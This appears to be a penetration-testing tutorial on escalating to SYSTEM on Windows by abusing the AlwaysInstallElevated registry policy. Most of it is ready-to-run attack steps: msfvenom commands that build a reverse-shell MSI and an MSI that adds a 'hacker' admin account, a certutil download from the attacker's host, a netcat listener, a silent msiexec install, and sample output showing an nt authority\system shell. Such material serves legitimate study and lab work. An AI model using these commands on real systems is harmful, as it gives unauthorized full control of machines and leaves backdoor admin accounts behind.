# 03 — AlwaysInstallElevated

## What is AlwaysInstallElevated?

Windows has a feature that allows `.msi` (Microsoft Installer) files to be installed with **elevated (SYSTEM) privileges**, even when run by a regular user.

This feature is controlled by two **registry keys**:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer → AlwaysInstallElevated = 1
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer  → AlwaysInstallElevated = 1
```

When **both** keys are set to `1`, any `.msi` file installed by any user runs as **SYSTEM**.

This is meant for enterprise environments where IT wants to let users install software without admin rights. But if misconfigured, any user can install a malicious `.msi` as SYSTEM.

---

## Step 1 — Check if AlwaysInstallElevated is Enabled

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `reg query` | Query Windows registry |
| `HKCU\...` | HKEY_CURRENT_USER — current user's registry hive |
| `HKLM\...` | HKEY_LOCAL_MACHINE — machine-wide registry hive |
| `/v AlwaysInstallElevated` | Show value of this specific key |

**Vulnerable output:**
```
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

`0x1` = 1 = Enabled. Both must be 1. If even one is missing or 0, this technique won't work.

---

## Step 2 — Create a Malicious MSI Payload

On Kali, use msfvenom to create a `.msi` file that contains a reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f msi -o malicious.msi
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `msfvenom` | Metasploit payload generator |
| `-p windows/x64/shell_reverse_tcp` | Windows 64-bit reverse shell payload |
| `LHOST=KALI_IP` | Your Kali IP (shell will connect back here) |
| `LPORT=4444` | Port to connect back to |
| `-f msi` | Output format: MSI installer file |
| `-o malicious.msi` | Output filename |

---

## Step 3 — Transfer MSI to Target

```bash
# On Kali — start web server
python3 -m http.server 8080
```

```cmd
# On Windows target — download
certutil -urlcache -f http://KALI_IP:8080/malicious.msi malicious.msi
```

---

## Step 4 — Set Up Listener on Kali

```bash
nc -lvnp 4444
```

---

## Step 5 — Run the MSI on Target

```cmd
msiexec /quiet /qn /i malicious.msi
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `msiexec` | Windows Installer tool — runs .msi files |
| `/quiet` | Quiet mode — no user interaction prompts |
| `/qn` | No GUI — completely silent installation |
| `/i malicious.msi` | Install this MSI file |

---

## Step 6 — Catch the Shell

On Kali, your listener catches the connection:

```
connect to [KALI_IP] from (UNKNOWN) [TARGET_IP] 53210
Microsoft Windows [Version 10.0.17763.107]

C:\Windows\system32>whoami
nt authority\system
```

---

## Alternative: Using Metasploit for the Entire Flow

If you already have a Meterpreter session:

```bash
# Inside msfconsole
use exploit/windows/local/always_install_elevated
set SESSION 1          # Your existing Meterpreter session ID
set LHOST KALI_IP
set LPORT 5555
run
```

This automatically checks the registry, creates the MSI, runs it, and gives you a SYSTEM Meterpreter shell.

---

## Alternative Payload: Add Admin User (no reverse shell needed)

Instead of a reverse shell, you can create an MSI that just adds a new admin user:

```bash
msfvenom -p windows/adduser USER=hacker PASS=Hacker123! -f msi -o adduser.msi
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `-p windows/adduser` | Payload that creates a Windows user |
| `USER=hacker` | New username |
| `PASS=Hacker123!` | Password (must meet complexity requirements) |
| `-f msi` | MSI format |

After running it:
```cmd
net localgroup administrators hacker /add
```

Wait — the `windows/adduser` payload already adds to administrators. Just verify:
```cmd
net localgroup administrators
# Should show "hacker" in the list
```

Then you can RDP in or use psexec as the new admin user.

---

## winPEAS Automated Check

If you're using winPEAS for automated scanning, it checks this automatically:

```
[+] AlwaysInstallElevated? YES
  [i] You can do a PrivEsc installing a malicious msi as a normal user
```

---

## Full Practical Example

```
Scenario: Low-priv Windows shell, running as regular user "john"

Step 1 — Check registry
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
AlwaysInstallElevated    REG_DWORD    0x1
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
AlwaysInstallElevated    REG_DWORD    0x1
✓ Both are 1 — vulnerable!

Step 2 — On Kali
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f msi -o evil.msi
$ python3 -m http.server 8080

Step 3 — On target
> certutil -urlcache -f http://10.10.10.5:8080/evil.msi evil.msi

Step 4 — On Kali
$ nc -lvnp 4444

Step 5 — On target
> msiexec /quiet /qn /i evil.msi

Step 6 — On Kali listener
connect to [10.10.10.5] from TARGET...
C:\Windows\system32> whoami
nt authority\system
```

---

## Why This Works

The key is that `msiexec` — the Windows Installer engine — runs as SYSTEM when AlwaysInstallElevated is active. Our malicious MSI's payload runs **inside the msiexec process**, which is already running as SYSTEM. So our reverse shell spawns as SYSTEM.

---

## Summary

```
1. Check both registry keys:
   reg query HKCU\...\Installer /v AlwaysInstallElevated
   reg query HKLM\...\Installer /v AlwaysInstallElevated
   
2. Both must show 0x1

3. Create MSI payload:
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o evil.msi

4. Transfer to target (python3 http.server + certutil)

5. Listener: nc -lvnp 4444

6. Run MSI:
   msiexec /quiet /qn /i evil.msi

7. Catch SYSTEM shell
8. Verify: whoami → nt authority\system
```
